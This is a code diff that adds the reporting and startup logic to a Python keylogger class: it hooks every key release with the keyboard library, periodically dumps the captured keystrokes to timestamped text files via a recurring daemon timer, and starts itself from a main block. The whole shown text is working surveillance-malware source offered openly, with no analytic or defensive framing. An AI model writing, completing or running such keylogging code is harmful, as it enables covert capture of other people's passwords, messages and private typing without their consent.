@@ -40,4 +40,40 @@ class KeyLogger:
         end_time_str = str(self.end_time)[:-7].replace(" ", "-").replace(":", "")
         self.filename = f"keylog-{start_time_str}_{end_time_str}"
 
+    def report_file(self):
+        with open(f"{self.filename}.txt", "w") as file:
+            print(self.log, file=file)
+
+        print(f"[+] Saved {self.filename}.txt")
+
+    def report(self):
+        if self.log:
+
+            self.end_time = datetime.now()
+
+            self.update_filename()
+            if self.report_method == "file":
+                self.report_file()
             
+            self.start_time = datetime.now()
+        
+        self.log = ""
+        timer = Timer(time_interval=self.time_interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        self.start_time = datetime.now()
+
+        keyboard.on_release(callback=self.callback)
+
+        self.report()
+
+        print(f"{datetime.now()} - KeyLogger Started!")
+
+        keyboard.wait()
+
+if __name__ == "__main__":
+
+    keylogger = KeyLogger(time_interval=REPORT_TIMER, report_method="file")
+    keylogger.start()
